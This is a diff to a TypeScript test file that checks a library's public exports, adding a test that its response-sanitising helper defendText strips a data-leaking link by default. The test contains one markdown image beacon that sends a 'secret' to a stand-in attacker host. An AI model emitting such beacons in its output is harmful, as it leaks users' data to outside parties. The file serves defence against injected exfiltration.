@@ -57,6 +57,7 @@ import type {
 // values are never read; only the type position matters for the guard.
 type _PinnedPublicTypes = [
     CustomToolMeta,
+    DefendTextOptions,
     InstanceUtilities,
     ExecuteRequestParams,
     CreateApiServerOptions,
@@ -111,6 +112,8 @@ import {
     safeHostname,
 } from "./lib/utils/index.js";
 import { sanitizeAndDetect, logInjectionDetected } from "./lib/security/detection-logger.js";
+import { defendText } from "./lib/response/index.js";
+import type { DefendTextOptions } from "./lib/response/index.js";
 
 describe("public barrel (src/lib.ts)", () => {
     describe("re-exports the same reference as the deep import", () => {
@@ -184,6 +187,22 @@ describe("public barrel (src/lib.ts)", () => {
         });
 
         // Section 7 — response-side defence helpers
+        it("defendText", () => {
+            expect(publicApi.defendText).toBe(defendText);
+        });
+
+        // A required field binds TypeScript callers and does nothing at
+        // runtime, and this export is published — so the JavaScript call the
+        // type forbids has to fail CLOSED. Through the barrel deliberately:
+        // that is the boundary a consumer actually reaches, and the defect
+        // being guarded is invisible to any test that passes the field.
+        // Reported independently by coderabbitai and codex on PR #33.
+        it("defendText defaults an omitted grammar selector to the strictest arm", () => {
+            const beacon = "![x](https://evil.test/?d=secret)";
+            // eslint-disable-next-line @typescript-eslint/no-explicit-any
+            const call = publicApi.defendText as (t: string, o: any) => string;
+            expect(call(beacon, { hostname: "h" })).not.toContain("evil.test");
+        });
         it("applySpotlighting", () => {
             expect(publicApi.applySpotlighting).toBe(applySpotlighting);
         });
@@ -233,6 +252,7 @@ describe("public barrel (src/lib.ts)", () => {
             "getMethodAnnotations",
             "sanitizeDescription",
             "MAX_CUSTOM_TOOL_DESCRIPTION_LENGTH",
+            "defendText",
             "applySpotlighting",
             "sanitizeResponse",
             "detectInjectionPattern",
